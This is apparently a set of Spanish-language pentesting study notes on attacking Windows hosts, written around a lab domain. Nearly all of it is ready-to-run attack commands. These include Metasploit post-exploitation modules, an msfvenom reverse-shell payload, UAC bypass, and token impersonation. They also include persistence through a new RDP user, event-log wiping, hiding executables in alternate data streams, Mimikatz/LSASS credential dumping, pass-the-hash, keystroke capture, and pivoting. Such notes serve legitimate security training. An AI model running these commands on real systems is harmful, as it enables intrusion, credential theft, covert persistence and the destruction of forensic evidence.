# 3º -  Ataques Basados en Host Windows

# Enumeración del Sistema

## Herramientas Metasploit (Post-Exploitation)

Recopilación de información y gestión de la sesión.

- `getsystem`: Intenta obtener privilegios SYSTEM automáticamente.
- `windows/gather/win_privs`: Checkear privilegios actuales de la sesión.
- `post/windows/gather/enum_logged_on_users`: Ver usuarios logueados actualmente e histórico.
- `post/windows/gather/checkvm`: Validar si el objetivo es una máquina virtual.
- `post/windows/gather/enum_applications`: Enumerar aplicaciones instaladas y su versión.
- `post/windows/gather/enum_av_excluded`: Enumera carpetas excluidas del antivirus.
- `post/windows/gather/enum_computers`: Enumera otras computadoras en el dominio.
- `post/windows/gather/enum_patches`: Enumera los parches aplicados en el sistema.
- `post/windows/gather/enum_shares`: Lista todos los recursos compartidos (shares) del sistema.
- `show_mount`: Lista unidades USB y discos montados.
- `post/windows/manage/archmigrate`: Migra y actualiza la arquitectura del proceso (x86 -> x64).

## Herramientas automáticas

### PriveSec Check

Deberemos descargar los archivos de [GitHub](https://github.com/itm4n/PrivescCheck) e introducirlos en la `Víctima` 

 Para ejecutarlo, en la carpeta: `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`

# Escalada de Privilegios

## Kernel Exploits

- **Herramientas:**
    - `windows-exploit-suggester.py --database <db.xls> --systeminfo systeminfo.txt`
    - Metasploit: `post/multi/recon/local_exploit_suggester`

## Bypass UAC

Saltar el control de cuentas de usuario si somos administradores locales pero con restricciones.

### Búsqueda de Módulos

- `search bypassuac`: Muestra todos los módulos de bypass disponibles en MSF.

### Akagi64.exe (UACMe)

- **Herramienta:** [UACMe](https://github.com/hfiref0x/UACME) (Akagi64.exe).
- *Uso:* `Akagi64.exe <numero_tecnica> <ruta_payload.exe>`
- *Generar Payload:*`bash msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.37.4 LPORT=4444 -f exe > 'payload.exe'`

### UAC In-Memory Injection (Metasploit)

En una sesión de Meterpreter activa:
- `use exploit/windows/local/bypassuac_injection`: Bypass usando inyección en memoria.

## Impersonación de Tokens (Access Token)

Robar tokens de procesos (LSASS) para escalar a SYSTEM.

- **Privilegios Requeridos:** `SeAssignPrimaryToken`, `SeCreateToken`, `SeImpersonateToken`.
- **Técnica (Meterpreter Incognito):**
    1. `load incognito`: Cargar módulo.
    2. `list_tokens -u`: Listar tokens disponibles (ej: NT AUTHORITY).
    3. `impersonate_token "NT AUTHORITY\\SYSTEM"`: Suplantar el token.
- **Otras herramientas:** RoguePotato, JuicyPotato.

## Persistencia y Mantenimiento

Una vez logramos una shell de metasploit será necesario mantener la shell activa, estable y limpia.

- **Migración de Procesos:**
    - `ps -S explorer.exe`: Buscamos el PID del proceso explorer.exe (estable).
    - `migrate <PID>`: Mudamos la reverseShell al proceso seleccionado.
    - `post/windows/manage/migrate`: Módulo alternativo de post-explotación para migrar.
- **Activar servicio RDP:**
    - Una vez ganado una `meterpreter`  deberemos migrar a `explorer.exe` :         `ps -S explorer.exe` y luego `migrate PID`
    - `run getgui -e -u user -p password` : Creamos un usuario para RDP
    - `xfreerdp /u:user /p:password /v:demo.ine.local` : Accedemos al usuario a través de nuestro user
- **Persistencia en Disco/Registro:**
    - `search platform:windows persistence`: Buscar módulos de persistencia.
    - *Nota:* Usar `multi/handler` para recibir la conexión de la persistencia configurada.
- **Limpieza de Huellas:**
    - `clearev`: Comando de meterpreter para borrar todos los logs de eventos.

# Vulnerabilidades del Sistema de Archivos

## Alternate Data Streams (ADS)

Atributos de archivo NTFS que pueden ocultar datos.

- **Ocultar binario:** `type malware.exe > legitimo.txt:oculto.exe`
- **Ejecutar:** Crear enlace simbólico y ejecutarlo.
`mklink link_falso.exe C:\Ruta\legitimo.txt:oculto.exe`

# Credential Dumping (Windows)

## NTLM Hashes

Una vez comprometida la máquina y con una `meterpreter` , podremos hacer uso del comando `hashdump`  para obtener hashes NTLM

- Luego deberemos migrar el proceso a uno que nos de `persistencia` y dejamos la sessión en `background` .
- Listamos los hashes con `creds`
- `use auxiliary/analyze/crack_windows` : Módulo para crackear creds (Establecer diccionario unix o rockyou)

## Archivos Desatendidos (Unattend)

Busca credenciales en texto claro o base64 en archivos de configuración de instalación.

- **Rutas comunes:** `C:\Windows\Panther\Unattend.xml`, `Autounattend.xml`.
- **PowerSploit:** `PowerUp.ps1` -> `Invoke-PrivescAudit`.
    - `cd “ruta_a_carpeta_PowerSploit`
    - `powershell -ep bypass`
    - `. .\PowerUp.ps1`
    - `Invoke-PrivescAudit`

## Mimikatz (Kiwi) & LSASS

Requiere privilegios elevados para leer de LSASS.

### **Metasploit (Kiwi):**

- `load kiwi`: Cargar módulo.
- `creds_all`: Recuperar todas las credenciales (comando rápido).
- `lsa_dump_sam`: Volcar base de datos SAM.
- `lsa_dump_secrets`: Volcar NTLM y syskeys.
- `upload <mimikatz_binary>`: Subir un binario de mimikatz personalizado.

### **Mimikatz Binario:**

- `privilege::debug`: Verificar privilegios de depuración.
- `sekurlsa::logonpasswords`: Dumping de contraseñas en texto claro.
- `lsadump::sam`: Volcado de la SAM local.

## Pass The Hash (PTH)

Autenticarse usando el hash NTLM en lugar de la contraseña en texto claro.

- **Herramientas:**
    - `psexec.py DOMINIO/usuario@<IP> -hashes <LM:NT>`
    - `crackmapexec smb <IP> -u user -H <hash> -x "comando"`
    - Metasploit: `exploit/windows/smb/psexec` (configurar SMBUser y SMBPass con el hash).

## KeyLogger

Una vez capturada una meterpreter podemos usar `keyscan`.

- `keyscan_start`: Empezar a sniffear teclas.
- `keyscan_dump`: Dumpear datos capturados.
- `keyscan_stop`: Detener la captura de teclas.

# Pivoting y Red (Network)

Movimiento lateral y acceso a redes internas a través de la víctima.

- **Enrutamiento:**
    - `run autoroute -s <red_victima>`: Crea una ruta hacia la red interna a través de la sesión actual.
- **Escaneo Interno:**
    - `auxiliary/scanner/portscan/tcp`: Escanear puertos de otras computadoras en la red interna.
- **Port Forwarding (Túnel):**
    - `portfwd add -l <puerto_local> -p <puerto_victima2> -r <ip_victima2>`: Crea un túnel TCP para acceder a un servicio interno desde tu máquina atacante (localhost).
- **Payloads para Pivoting:**
    - `set payload windows/meterpreter/bind_tcp`: **Importante:** Usar payloads `bind_tcp` (conexión directa) en lugar de `reverse_tcp` para saltar a segundas máquinas, ya que estas no suelen tener ruta directa de vuelta a tu IP.